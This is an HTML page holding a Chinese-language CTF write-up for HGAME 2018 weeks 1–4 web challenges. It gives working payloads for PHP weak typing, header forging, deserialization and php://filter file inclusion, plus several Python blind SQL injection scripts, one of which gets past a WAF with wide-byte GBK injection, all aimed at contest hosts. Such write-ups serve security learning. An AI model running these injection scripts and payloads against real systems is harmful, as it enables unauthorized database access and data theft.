@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="hgame week周"/>
+  <meta name="twitter:description" content="年终于过完了。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>hgame week周 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        hgame week周
+                    </h1>
+                    <h2 class="headline">
+                    Feb 22, 2018 09:54
+                    · 621 words
+                    · 3 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#week1">week1</a>
+<ul>
+<li><a href="#are-you-from-europe">Are you from Europe?</a></li>
+<li><a href="#special-number">special number</a></li>
+<li><a href="#can-u-find-me">can u find me?</a></li>
+<li><a href="#tell-me-what-you-want">tell me what you want</a></li>
+<li><a href="#我们不一样">我们不一样</a></li>
+</ul></li>
+<li><a href="#week2">week2</a>
+<ul>
+<li><a href="#random">Random?</a></li>
+<li><a href="#草莓社区-1">草莓社区-1</a></li>
+<li><a href="#草莓社区-2">草莓社区-2</a></li>
+<li><a href="#最简单的sql题">最简单的sql题</a></li>
+</ul></li>
+<li><a href="#week3">week3</a>
+<ul>
+<li><a href="#正常的sqli">正常的SQLi</a></li>
+<li><a href="#送分的sqli">送分的SQLi</a></li>
+<li><a href="#简单的sqli">简单的SQLi</a></li>
+</ul></li>
+<li><a href="#week4">week4</a>
+<ul>
+<li><a href="#又双叒叕是sqli">又双叒叕是SQLI</a>
+<ul>
+<li><a href="#一个小知识点">一个小知识点</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>年终于过完了。
+<!-- more --></p>
+
+<h1 id="week1">week1</h1>
+
+<h2 id="are-you-from-europe">Are you from Europe?</h2>
+
+<p>查看源码，得到一串加密的js，解密后得到flag</p>
+
+<pre><code>hgame{Th3_Ch0seN_0nE!}
+</code></pre>
+
+<h2 id="special-number">special number</h2>
+
+<p>题目给出源码，可以想到php中的弱类型0==&ldquo;任意字符&rdquo;
+json_decode函数在处理数字时，不会做处理。正则里又限制有字母，可联想到0e4564654654
+payload</p>
+
+<pre><code>http://118.25.18.223:10001/?key=0e4564654654
+</code></pre>
+
+<pre><code>hgame{pHp_w34k_typing_s000_e4sy}
+</code></pre>
+
+<h2 id="can-u-find-me">can u find me?</h2>
+
+<p>提示robot，查看robots.txt，发现f1aaaaaaaag.php文件，访问，又提示只有admin才可以查看，于是抓包将user改为admin即可。</p>
+
+<pre><code>hgame{78e01ee77a39ef4e}
+</code></pre>
+
+<h2 id="tell-me-what-you-want">tell me what you want</h2>
+
+<p>对数据包的修改，最后的数据包</p>
+
+<pre><code>POST /index.php HTTP/1.1
+Host: 123.206.203.108:10001
+User-Agent: please use Icefox/57.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Cookie: isadmin=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 127.0.0.1
+referer: www.google.com
+
+want=flag
+</code></pre>
+
+<pre><code>hgame{For9e_hTTp_iS_N0T_HArd}
+</code></pre>
+
+<h2 id="我们不一样">我们不一样</h2>
+
+<p>php弱类型比较，strcmp()函数比较一个数组和字符串时会返回null
+payload</p>
+
+<pre><code>http://118.25.18.223:10002/index.php
+post：
+str1=jshdka&amp;str2[]=sjdak
+</code></pre>
+
+<pre><code>hgame{g3t_f14g_is_so0000_ez}
+</code></pre>
+
+<h1 id="week2">week2</h1>
+
+<h2 id="random">Random?</h2>
+
+<p>提示有vim编辑文件，还说网不好，尝试备份文件文件泄露，得到源码</p>
+
+<pre><code>&lt;?php    
+error_reporting(0);
+include ('flag.php');
+
+class emmm
+{
+    var $public;
+    var $secret;
+}
+
+if ($_GET['emmm']) {
+    $emmm = unserialize($_GET['emmm']);
+        if (!is_object($emmm)) {
+        die(&quot;error&quot;);
+    }
+    $emmm-&gt;public = random_int(0, 100000000);
+    $emmm-&gt;secret = random_int(0, 100000000);
+    if ($emmm-&gt;public == $emmm-&gt;secret) {
+        echo $flag;
+    }
+}
+
+#highlight_file(__FILE__);
+
+?&gt;
+</code></pre>
+
+<p>南邮ctf里的反序列出过这个，构造数据</p>
+
+<pre><code>class emmm 
+{
+    var $public;
+    var $secret;
+}
+$emmm = new emmm();
+$emmm-&gt;public=&amp;$emmm-&gt;secret;
+echo serialize($emmm);
+//O:4:&quot;emmm&quot;:2:{s:6:&quot;public&quot;;N;s:6:&quot;secret&quot;;R:2;}
+</code></pre>
+
+<p>\$emmm-&gt;public=&amp;\$emmm-&gt;secret;是将两个变量指向同一个地址。</p>
+
+<pre><code>hgame{&amp;_Is_wondeRful!@#}
+</code></pre>
+
+<h2 id="草莓社区-1">草莓社区-1</h2>
+
+<pre><code>http://118.25.18.223:10011/show_maopian.php?mao=../flag.php
+</code></pre>
+
+<pre><code>hgame{#Ma0_pi4n_haO_k4n_ma#}
+</code></pre>
+
+<h2 id="草莓社区-2">草莓社区-2</h2>
+
+<p>点开发现url是这样的</p>
+
+<pre><code>http://118.25.18.223:10012/show_maopian.php?mao=2.jpg
+</code></pre>
+
+<p>感觉是文件包含，payload</p>
+
+<pre><code>http://118.25.18.223:10012/show_maopian.php?mao=php://filter/read=convert.base64-encode/resource=../flag.php
+</code></pre>
+
+<p>F12查看源码，得到flag</p>
+
+<pre><code>hgame{!m4o_pi4n_ChaO_hao_kan!}
+</code></pre>
+
+<h2 id="最简单的sql题">最简单的sql题</h2>
+
+<p>万能密码即可</p>
+
+<pre><code>hgame{@s0ng_fen_ti@}
+</code></pre>
+
+<h1 id="week3">week3</h1>
+
+<h2 id="正常的sqli">正常的SQLi</h2>
+
+<p>题目有源码泄露。index.php.bak</p>
+
+<pre><code>&lt;?php
+.....
+
+$username = base64_decode($_COOKIE['name']);
+
+.....
+
+$sql = &quot;select * from user where username = '{$username}'&quot;;
+$re = mysqli_query($conn, $sql);
+$rs = mysqli_fetch_array($re);
+
+// echo $rs['flag'];
+echo $username . '&lt;br/&gt;';
+echo &quot;因为出题人太懒了，所以现在没有任何功能&quot;;
+
+.....
+
+</code></pre>
+
+<p>时间盲注脚本</p>
+
+<pre><code>import base64
+import requests
+def  url(payload):
+	url = &quot;http://123.206.203.108:10010/normalSQLi/index.php&quot;
+	headers = {
+	'Cookie': 'name='+str(payload)+'; isadmin=0'
+	}
+	r = requests.post(url,headers=headers,timeout=4)
+def tryy(payload):
+	try:
+		url(payload)
+	except Exception as e:
+		return 1
+	else:
+		return 0
+flag = ''
+for mid in range(1,70):
+	min1 = 0
+	max1 = 255
+	while 1:
+		middle = int((min1+max1)/2)
+		#pa = &quot;admin' or if((ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(mid)+&quot;,1))&gt;&quot;+str(middle)+&quot;),sleep(5),0) # &quot;
+		#pa = &quot;admin' or if((ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='user'),&quot;+str(mid)+&quot;,1))&gt;&quot;+str(middle)+&quot;),sleep(5),0) # &quot;
+		pa = &quot;admin' or if((ascii(mid((select group_concat(flag) from user),&quot;+str(mid)+&quot;,1))&gt;&quot;+str(middle)+&quot;),sleep(5),0) # &quot;
+		payload = str(base64.b64encode(pa.encode('utf-8')),'utf-8')
+		time = tryy(payload)
+		if time==1:
+			min1 = middle
+		if time==0:
+			max1 = middle
+		if min1+1==max1:
+			flag = flag + chr(max1)
+			print(flag)
+			break
+	
+print(flag)
+
+</code></pre>
+
+<p>这里有一个自己以前没注意的小细节，导致在爆列名时候一直出错。
+就是在使用if(表达式,sleep(5),0)时，最好给表达式添加上括号(或者在表达式前后加上空格)，否则会在使用where=&ldquo;时无法注出数据，但是如果where后不使用单引号，那么不影响注入。即</p>
+
+<pre><code>#注入正常
+pa = &quot;admin' or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(mid)+&quot;,1))&gt;&quot;+str(middle)+&quot;,sleep(5),0) # &quot;
+#注入正常
+pa = &quot;admin' or if((ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema='user'),&quot;+str(mid)+&quot;,1))&gt;&quot;+str(middle)+&quot;),sleep(5),0) # &quot;
+#注入失败
+pa = &quot;admin' or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema='user'),&quot;+str(mid)+&quot;,1))&gt;&quot;+str(middle)+&quot;,sleep(5),0) # &quot;
+
+</code></pre>
+
+<p>flag</p>
+
+<pre><code>hgame{fLag_1s_h4re.....}
+</code></pre>
+
+<h2 id="送分的sqli">送分的SQLi</h2>
+
+<p>报错注入
+payload</p>
+
+<pre><code>http://118.25.18.223:10068/?id=1 and updatexml(1,concat(0x7e,(select mid(f111aaaggg_w3,10,30) from f111aa4g),0x7e),1); #
+</code></pre>
+
+<pre><code>hgame{Th3_e4sist_sql_injeCti0n##}
+</code></pre>
+
+<h2 id="简单的sqli">简单的SQLi</h2>
+
+<p>添加了MD5截断验证的bool盲注。</p>
+
+<pre><code>import hashlib
+import requests
+import re
+def md5(str1):
+    return hashlib.md5(str1.encode('utf-8')).hexdigest()
+def code_md5(str1):
+	i=1
+	while 1:
+		if md5(str(i))[4:8]==str(str1) :
+			return i;
+			# print(md5(str(i)))
+			# print(i)
+			break
+		else:
+			i+=1
+def url(mid,asc,code1):
+	global code
+	#url = &quot;http://118.25.18.223:10086/index.php?id=1\' and ascii(mid((select database()),%s,1))&gt;%s --+&amp;code=%s&quot;%(mid,asc,code1) #week3_sqli1
+	#url = &quot;http://118.25.18.223:10086/index.php?id=1\' and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s --+&amp;code=%s&quot;%(mid,asc,code1) #users,w3_fllllllll4ag
+	#url = &quot;http://118.25.18.223:10086/index.php?id=1\' and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='w3_fllllllll4ag'),%s,1))&gt;%s --+&amp;code=%s&quot;%(mid,asc,code1) #dajiangyoude,haishijiangyou,f111144g_w3_sqli1
+	url = &quot;http://118.25.18.223:10086/index.php?id=1\' and ascii(mid((select group_concat(f111144g_w3_sqli1) from w3_fllllllll4ag),%s,1))&gt;%s --+&amp;code=%s&quot;%(mid,asc,code1) 
+
+	cookie = {&quot;PHPSESSID&quot;:&quot;0cecc18815650852c2f7e718a3d5bff9&quot;}
+	content = requests.get(url,cookies=cookie)
+	md5_4 = re.findall(':=&quot;(.*)&quot;',content.text)
+	code = code_md5(md5_4[0])
+	#print(content.text)
+	if &quot;query false&quot; in content.text:
+		return 0
+	if &quot;query ok&quot; in content.text:
+		return 1
+	else:
+		return 2
+flag=''
+code = 'sdsd'
+for mid in range(1,50):
+	min1 = 0
+	max1 = 255
+	while 1:
+		middle = int((min1+max1)/2)
+		asc = str(middle)
+		# print(asc)
+		# print(url(mid,asc,code))
+		if url(mid,asc,code)==1:
+			min1 = middle
+		if url(mid,asc,code)==0:
+			max1 = middle
+		if min1+1==max1:
+			flag+=chr(max1)
+			print(flag)
+			break
+
+
+</code></pre>
+
+<pre><code>hgame{sql_Injection_s000oo_fun}
+</code></pre>
+
+<h1 id="week4">week4</h1>
+
+<h2 id="又双叒叕是sqli">又双叒叕是SQLI</h2>
+
+<p>index.php~拿到源码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    include(&quot;sql.php&quot;);
+    $waf=&quot;/(sleep|benchmark|union|group by|=|&gt;|&lt;|hex| |lower|strcmp|updatexml|xmlelement|extractvalue|concat|bin|sleep|mid\(|substr|left|ascii|\/\*|\*\/)/i&quot;;
+    if(isset($_GET['user'])){
+        if(preg_match_all($waf,$_GET['user'])!=0){
+            $user=&quot;admin&quot;;
+        }else{
+            $user = str_replace(&quot;'&quot;,&quot;\'&quot;,$_GET['user']);
+        }
+        //echo $user.&quot;&lt;br&gt;&quot;;
+        
+        $sqli = new mysqli($host,$username,$passwd,$database);
+        $sqli-&gt;set_charset(&quot;gbk&quot;);
+        $query=&quot;select * from users where username='&quot;.$user.&quot;'&quot;;
+        $result = $sqli-&gt;query($query);
+        //echo $sqli-&gt;error;
+        $num=0;
+        @$num = $result-&gt;num_rows;
+        if($num&gt;0){
+            while($row = $result-&gt;fetch_row()){
+                echo $row[0].&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;.$row[1].&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;.$row[2].&quot;&lt;br&gt;&quot;;
+            }
+        }
+    }   
+
+?&gt;
+</code></pre>
+
+<p>盲注脚本</p>
+
+<pre><code>import requests
+import string
+url = 'http://118.25.18.223:10088/?user='
+test=&quot;0123456789&quot;+string.ascii_letters+&quot;!@#$^&amp;*(){}=+`~_|&quot;
+# payload = '%%df%%27 or (select database() like \&quot;%s%%\&quot;)'%(test)
+# #payload = ' or (select database() like %s%% )'%(test)
+# print(payload)
+
+flag=''
+for x in range(1,50):
+	for x in test:
+		#payload = '%%df%%27%%0aor%%0a(select%%0adatabase()%%0alike%%0a\&quot;%s%%\&quot;)%%23'%(flag+x) # week44sqliii
+		#payload = '%%df%%27%%0aor%%0a((select%%0atable_name%%0afrom%%0ainformation_schema.tables%%0awhere%%0atable_schema%%0alike%%0adatabase()%%0alimit%%0a0,1)%%0alike%%0a\&quot;%s%%\&quot;)%%23'%(flag+x) #flllllag,users
+		#payload = '%%df%%27%%0aor%%0a((select%%0acolumn_name%%0afrom%%0ainformation_schema.columns%%0awhere%%0atable_name%%0alike%%0a&quot;flllllag&quot;%%0alimit%%0a1,1)%%0alike%%0a\&quot;%s%%\&quot;)%%23'%(flag+x) #notflag,thisisflag
+		payload = '%%df%%27%%0aor%%0a((select%%0athisisflag%%0afrom%%0aflllllag%%0alimit%%0a0,1)%%0alike%%0a\&quot;%s%%\&quot;)%%23'%(flag+x) #hgame{like!injection!so!g00d__}
+		
+		url1 = url+payload
+		r = requests.get(url1)
+		if '998' in r.text:
+			flag+=x
+			print(flag)
+			break
+
+</code></pre>
+
+<h3 id="一个小知识点">一个小知识点</h3>
+
+<p>使用宽字节进行盲注的时候，如果where语句的字段时字符型的时候，只能使用of，不可以使用and，因为使用and的时候，判断的依据是前面的语句是否查询出内容,如果判断是类型是字符型，宽字节的%df，字符也会进行比较，所以就算是闭合了单引号，但是是查不出东西的，但是如果判断的字段类型是int类型的话，就可以查出内容，因为mysql在比较的时候如果被比较的内容不是整型，那么mysql会自动将内容转换为整型。即 1a=1，是成立的。</p>
+
+<pre><code>select * from hgame where name='admin�\' order by 1#'  #name为varchar类型，则查不出内容，如果是int类型就可以
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2fhgame-week%25E5%2591%25A8%2f - hgame%20week%e5%91%a8 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
